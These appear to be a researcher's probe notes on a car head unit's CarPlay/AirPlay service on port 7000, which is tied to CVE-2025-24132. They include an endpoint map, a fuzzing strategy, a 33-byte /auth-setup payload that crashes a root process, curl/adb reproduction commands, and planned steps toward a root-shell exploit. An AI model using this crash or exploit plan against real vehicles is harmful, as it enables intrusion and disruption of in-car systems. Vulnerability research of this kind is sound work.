# AirPlay Port 7000 Live Probe Results

## Prerequisites
- iPhone connected via USB to establish CarPlay link
- `sys.carplay.connected=1`, `sys.carplay.transport=0` (USB)

## Server Info
- **Server:** `AirTunes/450.14`
- **Port:** 7000 (0.0.0.0, TCP + IPv6)
- **Process:** carplayserv (root, carplayserv:s0 SELinux domain)

## Endpoint Map (Active CarPlay Session)

### Working Endpoints
| Method | Endpoint | Response | Notes |
|--------|----------|----------|-------|
| GET | `/info` | 455 | Method Not Valid In This State (session busy) |
| POST | `/feedback` | **200 OK** | Accepts `application/x-apple-binaryplist` body |
| POST | `/auth-setup` | 400/empty | Crashed server with 4-byte garbage (SIGSEGV in carplay.ui) |
| POST | `/pair-setup` | 403 | Exists but forbidden |
| POST | `/pair-verify` | reset | Connection reset by peer |
| RECORD | `/stream` | 455 | RTSP method accepted, busy state |
| FLUSH | `/stream` | 455 | RTSP method accepted, busy state |
| ANNOUNCE | `/stream` | 501 | Not implemented |

### Not Found (404)
`/server-info`, `/getProperty`, `/setProperty`, `/rate`, `/scrub`, `/stop`, `/action`, `/reverse`

## Key Findings

### /feedback (200 OK — primary entry point)
- Accepts POST with `Content-Type: application/x-apple-binaryplist`
- Valid binary plist with `{'category': 0}` → 200 OK
- No response body (server keeps connection open)
- **This is the main attack surface for CVE-2025-24132 during active session**

### /auth-setup (caused crash)
- Sending 4 bytes of garbage → server closed connection
- Caused SIGSEGV in `com.byd.carplay.ui` (binderDied callback, fault addr 0x10)
- carplayserv restarted (PID changed)
- Crash was in Java app (null deref), not native carplayserv
- **Native crash in carplayserv itself not yet confirmed**

### /stream RTSP methods
- RECORD and FLUSH return 455 (busy) — endpoints exist
- ANNOUNCE returns 501 — not supported
- These process RTSP headers and SDP data

## Attack Strategy
1. **Fuzz /feedback** with malformed binary plists
2. **Test /stream** with RTSP ANNOUNCE + SDP (after stopping CarPlay to avoid 455)
3. **Test /auth-setup** with various key exchange formats
4. **Test HTTP parser edge cases**: chunked encoding, large headers, pipelining
5. **Monitor for SIGSEGV** in carplayserv (native crash = potential RCE)


## CRITICAL: /auth-setup Native Crash (CVE-2025-24132 candidate)

### Confirmed Crash
- **Payload:** `auth_v0_33` — 33 bytes: `[0x00][32 bytes random Ed25519 key]`
- **Result:** carplayserv SIGSEGV, PID changed (23242 → 28366)
- **Process:** Native carplayserv (root), NOT Java app
- **Trigger:** Valid AirPlay auth-setup format (version 0 + 32-byte key)

### Payload Details
```
Version 0 (Ed25519 key exchange):
[0x00] — version byte (PSV=0, standard key exchange)
[32 bytes] — Ed25519 public key (random data)
Total: 33 bytes
```

### Why This is CVE-2025-24132
1. carplayserv runs AirPlay/450.14 (pre-fix SDK)
2. /auth-setup processes Ed25519 key exchange
3. Valid format causes NATIVE crash (SIGSEGV in root process)
4. This is "memory handling" issue as described in CVE
5. Crash kills CarPlay session (iPhone disconnects)

### Crash Reproduction
```bash
# Requires active CarPlay session (iPhone connected via USB)
python3 -c "import os; open('/tmp/auth.bin','wb').write(b'\x00'+os.urandom(32))"
adb push /tmp/auth.bin /data/local/tmp/auth.bin
adb shell 'curl -X POST http://127.0.0.1:7000/auth-setup \
  -H "Content-Type: application/octet-stream" \
  --data-binary @/data/local/tmp/auth.bin'
# carplayserv crashes and restarts
```

### Next Steps
1. Capture crash backtrace (need logcat running before crash)
2. Map crash PC to carplayserv binary offset
3. Find the exact memory corruption in Ghidra
4. Develop exploit: crash → controlled PC → root shell

### Other /auth-setup Tests
| Payload | Size | Result |
|---------|------|--------|
| version 0 + 32-byte key | 33 | **CRASH** |
| version 0 + 31-byte key | 32 | 000 (no response, post-crash) |
| version 1 + 96-byte data | 97 | 000 |
| invalid version (0xFF) | 33 | 000 |
| version 0 + extra 1000 bytes | 1033 | 000 |
| just version byte | 1 | 000 |
| version 0 + all-zero key | 33 | 000 |

All subsequent tests returned 000 because the crash disrupted the CarPlay session.
